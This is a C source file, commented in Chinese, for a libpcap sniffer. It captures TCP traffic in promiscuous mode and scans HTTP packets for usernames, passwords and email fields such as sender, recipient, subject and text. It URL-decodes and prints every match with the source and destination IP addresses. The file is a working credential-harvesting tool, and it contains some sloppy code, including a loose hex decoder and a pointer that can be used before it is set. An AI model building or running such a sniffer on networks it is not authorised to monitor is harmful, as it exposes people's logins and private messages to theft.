    #include <time.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <pcap/pcap.h>
    #include <arpa/inet.h>
    #include <netinet/ether.h>
    #define BURSIZE 2048
 
#define NON_NUM '0'
 
int hex2num(char c)
{
    if (c>='0' && c<='9') return c - '0';
    if (c>='a' && c<='z') return c - 'a' + 10;//这里+10的原因是:比如16进制的a值为10
    if (c>='A' && c<='Z') return c - 'A' + 10;
    
    printf("unexpected char: %c", c);
    return NON_NUM;
}
 
/**
 * @brief URLDecode 对字符串URL解码,编码的逆过程
 *
 * @param str 原字符串
 * @param strSize 原字符串大小（不包括最后的\0）
 * @param result 结果字符串缓存区
 * @param resultSize 结果地址的缓冲区大小(包括最后的\0)
 *
 * @return: >0 result 里实际有效的字符串长度
 *            0 解码失败
 */
int URLDecode(const char* str, const int strSize, char* result, const int resultSize)
{
    char ch,ch1,ch2;
    int i;
    int j = 0;//record result index
 
    if ((str==NULL) || (result==NULL) || (strSize<=0) || (resultSize<=0)) {
        return 0;
    }
 
    for ( i=0; (i<strSize) && (j<resultSize); ++i) {
        ch = str[i];
        switch (ch) {
            case '+':
                result[j++] = ' ';
                break;
            case '%':
                if (i+2<strSize) {
                    ch1 = hex2num(str[i+1]);//高4位
                    ch2 = hex2num(str[i+2]);//低4位
                    if ((ch1!=NON_NUM) && (ch2!=NON_NUM))
                        result[j++] = (char)((ch1<<4) | ch2);
                    i += 2;
                    break;
                } else {
                    break;
                }
            default:
                result[j++] = ch;
                break;
        }
    }
    
    result[j] = 0;
    return j;
}
 
    //定义链路层数据包格式
    typedef struct {
        u_char DestMac[6];
        u_char SrcMac[6];
        u_char Etype[2];
    }ETHHEADER;

    //定义IP首部格式
    typedef struct ip_hdr
    {  
        unsigned char h_verlen;//4位首部长度，4位IP版本号  
        unsigned char tos;//8位服务类型TOS  
        unsigned short tatal_len;//16位总长度  
        unsigned short ident;//16位标示  
        unsigned short frag_and_flags;//偏移量和3位标志位  
        unsigned char ttl;//8位生存时间TTL  
        unsigned char proto;//8位协议（TCP,UDP或其他）  
        unsigned short checksum;//16位IP首部检验和  
        unsigned int sourceIP;//32位源IP地址  
        unsigned int destIP;//32位目的IP地址  
    }IPHEADER;

    //定义TCP首部格式
    typedef struct tcp_hdr
    {
        unsigned short sport;//16位源端口  
        unsigned short dport;//16位目的端口  
        unsigned int seq;//32位序列号  
        unsigned int ack;//32位确认号  
        unsigned char lenres;//4位首部长度/6位保留字  
        unsigned char flag;//6位标志位  
        unsigned short win;//16位窗口大小  
        unsigned short sum;//16位检验和  
        unsigned short urp;//16位紧急数据偏移量  
    }TCPHEADER;

    //全局变量
    int flag = 0;               //是否只显示嗅探到用户名或口令的包，默认为否
    long number =0;      //已嗅探到的包总数

    int isHTTP(char *datatcp, int len)
        //判断TCP包中是否有HTTP包，通过是否包含"HTTP/"来判断
    {
        int i=0;

        //只在TCP数据的前200字节查找
        int min=200;
        if(len<200){
            min=len;
        }
        //开始查找
        for(i=0;i<min;i++){
            if(datatcp[i]=='H' && i<min-4){
                if(datatcp[i+1]=='T'&&datatcp[i+2]=='T'&&datatcp[i+3]=='P'&&datatcp[i+4]=='/'){
                    return 1;
                }
            }
        }
        return 0;
        /*
        //判断TCP包中是否有HTTP包，通过是否以"HTTP/"开头来判断
        if(datatcp[0]=='H' && datatcp[1]=='T' && datatcp[2]=='T' && datatcp[3]=='P' && datatcp[4]=='/'){
            return 1;
        }else{
            return 0;    
        }
        */
    }

    void printHTTPhead(char *httphead, int len)
        //打印HTTP头部信息或头部第一行（取决于全局变量flag）
        //打印头部信息时遇到连续两个换行结束
    {
        int i;
        for(i=0;i<len;i++){
            if(httphead[i]=='\r' && httphead[i+1]=='\n' && httphead[i+2]=='\r' && httphead[i+3]=='\n'){
                httphead[i]='\0';
                httphead[i+1]='\0';
                break;
            }
            if( flag && httphead[i]=='\r' && httphead[i+1]=='\n'){
                httphead[i]='\0';
                httphead[i+1]='\0';
                break;
            }
        }
        if(httphead[0]==0x01&&httphead[1]==0x01&&httphead[2]==0x08&&httphead[3]==0x0a){
            //TCP PAWS处理 
            //http://www.unixresources.net/linux/clf/linuxK/archive/00/00/13/92/139290.html
            printf("%s", httphead+12);
        }else{
            printf("%s", httphead);
        }
        httphead[i]='\r';
        httphead[i+1]='\n';
    }

    int findPasswd(char *data, int len){
        //从HTTP包的数据部分寻找可能存在的用户名和密码，返回找到的个数
        //密码可能在URL里，cookie里，HTTP数据里，只能在整个http报文中匹配
        int i=0, j=0, min=200;
        int p=0;        //在data中的总偏移，用于防止修改非法地址的值
        int num=0;   
        char temp;
        char * next;
        char * start;
        char * keyword[] = {    //字典，本程序核心技术所在
                                         "username=",        
                                        "password=", 
                                         "from=",
                                         "to=",
                                          "subject=",
                                         "text=",
                                        
                                         
                                         
                                        
                                         };
        int l=sizeof(keyword) / sizeof(keyword[0]);

        /* 由于TCP首部是变长的，传来的data可能包含有部分TCP首部数据，并不一定是HTTP数据
             故先查找字符串"HTTP/"或"POST"或"GET"，从这个字符串后匹配用户名密码*/
        for(i=0;i<min;i++){
            if(data[i]=='H' && i<min-4){
                if(data[i+1]=='T' && data[i+2]=='T' && data[i+3]=='P' && data[i+4]=='/'){
                    start = data+i;
                    break;
                }
            }
            if(data[i]=='G' && i<min-3){
                if(data[i+1]=='E' && data[i+2]=='T'){
                    start = data+i;
                    break;
                }
            }
            if(data[i]=='P' && i<min-4){
                if(data[i+1]=='O' && data[i+2]=='S' && data[i+3]=='T'){
                    start = data+i;
                    break;
                }
            }
        }

        /* 依次匹配每个关键词 */
        for(i=0;i<l;i++){
            next = start;
            p = 0;
            while( next = strstr(next, keyword[i]) ){   //一个关键词可能出现多次
                j=0;
                while(next[j]!='\n' && next[j]!='\r' && next[j]!='&' && next[j]!=';' && next[j]!=' '){
                    //若密码中出现了空格和分号，会被自动转码为+和%%3B，而密码中的+会被自动转码为%2B
                    if(p>=len){
                        break;
                    }
                    j++;
                    p++;
                }
                temp = next[j];
                next[j] = '\0';
                if(num==0){
                    printf("**********嗅探结果***********\n");
                }
                char obj[1000] = {0};
 
                 unsigned int len = strlen(next);
                 int resultSize = URLDecode(next, len, obj, 1000);
                 printf( "\n%s", obj);
                
                num++;
                next[j] = temp;
                next = next + j;
      
            }
        }
        
        return num;
    }

    void pcap_handle(u_char* user,const struct pcap_pkthdr* header,const u_char* pkt_data)
        //pcap_loop回调函数
    {
        /* 声明变量 */
        int off,ret;
        time_t timep;
        char * datatcp;
        char szSourceIP[MAX_ADDR_LEN*2], szDestIP[MAX_ADDR_LEN*2];  //源IP和目的IP
        struct sockaddr_in saSource, saDest;                                                 //源地址结构体，目的地址结构体

        /* 设置各种头指针  */
        if(header->len<sizeof(ETHHEADER)) return;              //数据帧长度小于以太网头，不做处理
        IPHEADER *pIpheader=(IPHEADER*)(pkt_data+sizeof(ETHHEADER));
        TCPHEADER *pTcpheader = (TCPHEADER*)(pkt_data + sizeof(ETHHEADER) + sizeof(IPHEADER));
        if(pIpheader->proto!=6) return;                                 //只处理TCP数据
        off = sizeof(IPHEADER) + sizeof(TCPHEADER) + sizeof(ETHHEADER);
        datatcp = (unsigned char *)pkt_data + off;

        if(isHTTP(datatcp, header->len-off)){
            /* 若是HTTP报文 */

            number ++;

            //打印嗅探结果
            ret = findPasswd(datatcp, header->len-off);
            if(ret==0 && flag==0){
                //没有嗅探到任何口令
                printf("**********嗅探结果***********");
                printf("\n没有嗅探到");
            }

            //flag为1时跳过未嗅探到口令的包
            if(ret==0 && flag) return;

            // 解析IP地址
            saSource.sin_addr.s_addr = pIpheader->sourceIP;
            strcpy(szSourceIP, inet_ntoa(saSource.sin_addr));
            saDest.sin_addr.s_addr = pIpheader->destIP;
            strcpy(szDestIP, inet_ntoa(saDest.sin_addr));

            if(!flag){
                //打印全部信息
                time (&timep); 
                /*printf("\n**********数据包信息***********");
                printf("\n数据包编号: %ld", number);
                printf("\n数据包长度: %d", header->len);
                printf("\n捕获时间: %s", asctime(localtime(&timep)));
                printf("**********IP协议头部***********");  
                printf("\n标示: %i", ntohs(pIpheader->ident));  
                printf("\n总长度: %i", ntohs(pIpheader->tatal_len));  
                printf("\n偏移量: %i", ntohs(pIpheader->frag_and_flags));  
                printf("\n生存时间: %d",pIpheader->ttl);  
                printf("\n服务类型: %d",pIpheader->tos);  
                printf("\n协议类型: %d",pIpheader->proto);  
                printf("\n检验和: %i", ntohs(pIpheader->checksum));  
                printf("\n源IP: %s", szSourceIP);  
                printf("\n目的IP: %s", szDestIP);  
                printf("\n**********TCP协议头部***********");  
                printf("\n源端口: %i", ntohs(pTcpheader->sport));  
                printf("\n目的端口: %i", ntohs(pTcpheader->dport));  
                printf("\n序列号: %i", ntohs(pTcpheader->seq));  
                printf("\n应答号: %i", ntohs(pTcpheader->ack));  
                printf("\n检验和: %i", ntohs(pTcpheader->sum));*/

                //打印HTTP头部信息
               /* printf("\n**********HTTP协议头部***********\n");
                printHTTPhead(datatcp, header->len-off);*/
            }
            else{
                //只打印必须的信息（必须是指能识别出具体发往哪个网页）
                printf("\n源IP: %s, 目的: %s:%i\t", szSourceIP, szDestIP, ntohs(pTcpheader->dport));
                printHTTPhead(datatcp, header->len-off);
            }
            //额外的换行
            printf("\n\n");
        }

        /*
        //显示数据帧内容
        int i;
        for(i=0; i<(int)header->len; ++i)  {  
            printf(" %02x", pkt_data[i]);  
            if( (i + 1) % 16 == 0 )   
                printf("\n");  
        }
        */
    }

    int main(int argc, char** argv)
    {
        /* 声明变量 */
        int id = 0;
        char errpkt_data[1024];
        char *dev="ens33";
        bpf_u_int32 ipmask=0;
        struct bpf_program fcode;
        struct pcap_pkthdr packet;

        /* 处理参数 */
        if(argc==2){
            dev = argv[1];  //指定网卡
        }
        else if(argc==3){
            dev = argv[1];  //指定网卡
            flag = 1;           //只显示嗅探到用户名或口令的包
        }

        /* 打开网络设备 */
        pcap_t* device=pcap_open_live(dev, 65535, 1, 0, errpkt_data);
        if(!device){
            printf("%s\n", errpkt_data);
            return 1;
        }

        /* 设置过滤规则，只抓取TCP包 */
        if(pcap_compile(device, &fcode, "tcp", 0, ipmask)==-1){
            printf("%s\n", pcap_geterr(device));
        }
        if(pcap_setfilter(device, &fcode)==-1){
            printf("%s\n", pcap_geterr(device));
            return 1;
        }

        /* 开始抓包 */
        pcap_loop(device, -1, pcap_handle, (u_char*)&id);
        return 0;
    }
